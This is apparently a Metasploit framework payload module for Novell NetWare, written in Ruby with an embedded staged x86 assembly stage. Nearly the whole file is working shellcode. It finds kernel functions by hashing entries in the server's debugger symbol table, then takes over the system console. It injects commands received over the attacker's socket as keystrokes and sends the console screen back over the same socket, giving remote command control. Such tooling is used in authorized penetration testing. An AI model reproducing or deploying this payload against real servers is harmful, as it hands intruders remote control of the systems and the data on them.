##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'NetWare Command Shell',
      'Description'   => 'Connect to the NetWare console (staged)',
      'Author'        => 'toto',
      'License'       => MSF_LICENSE,
      'Platform'      => 'netware',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadCompat' =>
        {
          'Convention' => 'sockesi'
        },
      'Stage'         =>
        {
          'Offsets' =>
            {
              #'EXITFUNC' => [ 443, 'V' ]
            },
          'Assembly' => <<EOS
jmp main_code
;;;
; resolve a symbol address using the DebuggerSymbolHashTable
; (could resolve only against function name for smaller code)
;;;

resolv_addr:
  push edi
  push ecx
  xor edi, edi
r_loop:
  mov edx, [ebp+edi*4]
  test edx, edx
  jz  r_next
r_loop2:
  xor esi, esi
  mov ebx, [edx+8]
  mov al, byte ptr[ebx]
r_iloop2:
  test al, al
  jz r_after2
  inc ebx
  movzx ecx, byte ptr[ebx]
  ror esi, 0x0d
  add esi, ecx
  dec al
  jmp r_iloop2
r_after2:
  cmp esi, [esp+0x0c]
  jz r_found
  mov edx, [edx]
  test edx, edx
  jnz r_loop2
r_next:
  inc edi
  cmp edi, 0x200
  jnz r_loop
  jmp r_end
r_found:
  mov eax, [edx+4]
r_end:
  pop ecx
  pop edi
  ret


main_code:
  ; save socket identifier
  call main_next
main_next:
  pop edi
  add edi, (socket_ptr - main_next)
  mov eax, esi
  stosd

  ; search DebuggerSymbolHashTable pointer using GDT system call gate
  ; -> points inside SERVER.NLM
  cli
  sub esp, 8
  mov ecx, esp
  sgdt [ecx]

  cli
  mov ebx, [ecx+2]
  mov bp, word ptr [ebx+0x4E]
  shl ebp, 16
  mov bp, word ptr [ebx+0x48]

f_finddebugger:
  cmp dword ptr[ebp], 0
  jnz f_next
  cmp dword ptr[ebp+4], 0x808bc201
  jz f_end
f_next:
  dec ebp
  jmp f_finddebugger
f_end:
  mov ebp, [ebp-7]

  ; resolve function pointers
  mov cl, 15
resolv_ptrs:
  push [edi]
  call resolv_addr
  stosd
  dec cl
  test cl, cl
  jnz resolv_ptrs

  sti

  ; all screens have the same size
  push edi
  lea esi, [edi+4]
  push esi
  call [edi-0x18]        ; SERVER.NLM|GetScreenSize

  ; allocate 2 buffer for the main screen and the backup
  xor eax, eax
  xor ebx, ebx
  mov ax, word ptr[edi]
  mov bx, word ptr[esi]
  imul eax, ebx
  mov [edi+8], eax

  push eax
  call [edi-8]          ; AFPTCP.NLM|LB_malloc
  mov [edi+0xc], eax

  call [edi-0x14]       ; SERVER.NLM|GetSystemConsoleScreen
  mov [edi+0x10], eax

  sub esp, 4
  mov ebp, esp          ; n

recv_loop:
  xor ebx, ebx
  inc ebx

  push 200000           ; tv_usec
  push 0                ; tv_sec (0)
  mov edx, esp          ; timeout

  sub esp, 4
  mov ecx, esp          ; rescode

  push 1                ; num socket (1)
  push ecx              ; &rescode
  push edx              ; &timeout
  push 0                ; NULL
  push 0                ; NULL
  push 0                ; NULL
  push [edi-0x40]       ; socket
  call [edi-0x2C]       ; LIBC.NLM|bsd_select_mp
  add esp, 0x28
  test eax, eax
  jnz end

  call update_screen

  sub esp, 4
  mov edx, esp
  push edx              ; &rescode
  push ebp              ; &n
  push ebx              ; FIONREAD
  push [edi-0x40]       ; socket
  call [edi-0x38]       ; LIBC.NLM|_ioctlsocket
  add esp, 0x14
  test eax, eax
  jnz end
  cmp [ebp], 0
  jz recv_loop
  ; check we are not longer than the key buffer size
  cmp [ebp], 32
  jbe recvd
  mov [ebp], 32
recvd:
  lea eax, [edi+0x20]
  push [ebp]
  push eax
  call recv_data
  add esp, 8

  mov ebx, [ebp]
  lea esi, [edi+0x20]
  mov byte ptr[esi+ebx], 0

  ;push 0x00FFFEFF
  ;mov eax, esp
  ;push eax
  ;push [edi+0x10]         ; screen
  ;call [edi-0x3C]         ; SERVER.NLM|DirectOutputToScreen
  ;add esp, 0x0c

send_input:
  movzx eax, byte ptr[esi]
  test eax, eax
  jz send_end

  cmp al, 0x0a
  jz send_enter

  ; we need to inject the command in the console input
  push 0x00
  push 0x00               ; should be the keycode in fact
  push eax                ; key value
  push 0x0
  push [edi+0x10]         ; screen
  call [edi-0x20]         ; SERVER.NLM|AddKey
  jmp send_next

send_enter:
  ; send special code for enter
  push 0x1c
  push 0x00
  push 0x00
  push 0x02
  push [edi+0x10]         ; screen
  call [edi-0x20]         ; SERVER.NLM|AddKey

  push 0x00FFFEFF
  mov eax, esp
  push eax
  push [edi+0x10]         ; screen
  call [edi-0x3C]         ; SERVER.NLM|DirectOutputToScreen
  add esp, 0x0c
send_next:

  add esp, 0x14
  inc esi
  jmp send_input
send_end:

  jmp recv_loop

end:
  sub esp, 4
  mov ebp, esp          ; rescode

  push ebp              ; rescode
  push 2                ; SHUT_RDWR
  push [edi-0x40]       ; socket
  call [edi-0x30]       ; LIBC.NLM|bsd_shutdown_mp

  push ebp              ; rescode
  push [edi-0x40]       ; socket
  call [edi-0x34]       ; LIBC.NLM|bsd_close_mp

  ; go back to the main kernel loop
  call [edi-0x0C]       ; SERVER.NLM|kWorkerThread


update_screen:
  pushad

  push [edi+0x0c]
  push 0
  push [edi+0x08]
  push 0
  push [edi+0x10]
  call [edi-0x1C]       ; SERVER.NLM|ReadScreenIntoBuffer
  add esp, 0x14

  mov edx, [edi+0x0c]
  xor ebx, ebx
  xor esi, esi
  xor ebp, ebp
checksum:
  cmp ebx, [edi+4]
  jz end_checksum
  xor ecx, ecx
check_line:
  cmp ecx, [edi]
  jz next_line
  mov al, byte ptr[edx]
  ror esi, 0x0d
  add esi, eax
  cmp [edx], 0x20FFFEFF
  jnz check_line2
  mov ebp, ebx
  inc ebp
check_line2:
  inc edx
  inc ecx
  jmp check_line
next_line:
  inc ebx
  jmp checksum
end_checksum:

  cmp esi, [edi+0x14]
  jnz new_checksum
  cmp [edi+0x18], 1
  jz end_update
  mov [edi+0x18], 1
  push ebp
  call send_screen
  add esp, 4
  jmp end_update

new_checksum:
  mov [edi+0x14], esi
  mov [edi+0x18], 0
end_update:
  popad
  ret


send_screen:
  push ebx

  sub esp, 4
  mov esi, esp

  push esi
  lea eax, [esi+2]
  push eax
  push [edi+0x10]
  call [edi-0x10]       ; SERVER.NLM|GetInputCursorPosition
  add esp, 0x0c

  mov ebx, [esp+0x0c]
  xor edx, edx
  mov ecx, [edi+0x0c]
  mov eax, dword ptr[edi]
  imul eax, ebx
  add ecx, eax

send_loop:
  cmp bx, word ptr[esi+2]
  jae last_line
  mov dx, word ptr[edi]
  jmp next_send
last_line:
  mov dx, word ptr[esi]
next_send:

  push edx
  push ecx
  call send_data
  add esp, 0x08

  cmp bx, word ptr[esi+2]
  jae end_sl

  push 0x0000000a
  mov eax, esp
  push 1
  push eax
  call send_data
  add esp, 0x0C

  inc ebx
  add ecx, edx
  cmp bx, word ptr[esi+2]
  jbe send_loop
end_sl:
  pop ebx
  pop ebx
  ret


send_data:
  push [esp+8]
  push [esp+8]
  push [edi-0x40]
  push [edi-0x24]
  call sendrecv_data
  add esp, 0x10
  ret

recv_data:
  push [esp+8]
  push [esp+8]
  push [edi-0x40]
  push [edi-0x28]
  call sendrecv_data
  add esp, 0x10
  ret


sendrecv_data:
  push ebp
  push ecx
  push ebx
  push edx
  mov ebp, esp

  push [ebp+0x20]         ; iov_len
  push [ebp+0x1C]         ; iov_base
  mov ecx, esp            ; msg_iov

  xor ebx, ebx            ; struct msghdr
  push ebx                ; msg_flags
  push ebx                ; msg_controllen
  push ebx                ; msg_control
  inc ebx
  push ebx                ; msg_iovlen (1 array)
  dec ebx
  push ecx                ; msg_iov
  push ebx                ; msg_namelen
  push ebx                ; msg_name

  mov ecx, esp            ; message

  sub esp, 4
  mov edx, esp            ; rescode

  push edx                ; rescode
  push 0                  ; flags
  push ecx                ; message
  push [ebp+0x18]         ; socket
  call [ebp+0x14]         ; SERVER.NLM|bsd_recvmsg_mp

  mov esp, ebp
  pop edx
  pop ebx
  pop ecx
  pop ebp
  ret




socket_ptr:
  dd 0
fct_ptrs:
  dd 0xadc21dfc         ; SERVER.NLM|DirectUnformattedOutputToScreen
  dd 0xb08c8051         ; LIBC.NLM|_ioctlsocket
  dd 0x4907702d         ; LIBC.NLM|bsd_close_mp
  dd 0x312cc527         ; LIBC.NLM|bsd_shutdown_mp
  dd 0x46c65ccd         ; LIBC.NLM|bsd_select_mp
  dd 0x3605cc1c         ; LIBC.NLM|bsd_recvmsg_mp
  dd 0x35bdd27c         ; LIBC.NLM|bsd_sendmsg_mp
  dd 0xe98bfec3         ; SERVER.NLM|AddKey
  dd 0x6ea378a4         ; SERVER.NLM|ReadScreenIntoBuffer
  dd 0x898d560c         ; SERVER.NLM|GetScreenSize
  dd 0x03cfcbe3         ; SERVER.NLM|GetSystemConsoleScreen
  dd 0xfe52051f         ; SERVER.NLM|GetInputCursorPosition
  dd 0x9294bdcb         ; SERVER.NLM|kWorkerThread
  dd 0x6877687c         ; AFPTCP.NLM|LB_malloc
  dd 0xaf50f9e7         ; AFPTCP.NLM|LB_free
screen_info:
  dd 0
  dd 0
  dd 0
  dd 0
  dd 0
  dd 0            ; screen checksum
  dd 0            ; screen state
end_reverse:
  nop
EOS
        }
      ))
  end

  def size
    279
  end
end
